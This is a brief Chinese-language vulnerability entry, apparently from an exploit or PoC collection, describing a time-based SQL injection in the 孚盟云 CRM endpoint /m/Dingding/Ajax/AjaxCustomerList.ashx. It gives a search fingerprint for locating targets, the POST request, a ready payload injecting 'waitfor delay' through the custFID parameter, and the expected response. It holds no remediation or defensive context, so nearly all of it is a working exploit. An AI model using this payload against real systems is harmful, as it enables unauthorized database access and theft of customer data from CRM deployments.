# 孚盟云CRMAjaxCustomerList.ashx存在SQL注入漏洞

孚盟云 ｜ SQL注入 ｜ —
- **指纹**：`title="孚盟云"`
- **请求**：`POST /m/Dingding/Ajax/AjaxCustomerList.ashx HTTP/1.1`

**Payload**
```
method=GetCustomerInfoByFid&custFID=123';waitfor+delay+'0:0:5'--+
```
- **响应特征**：200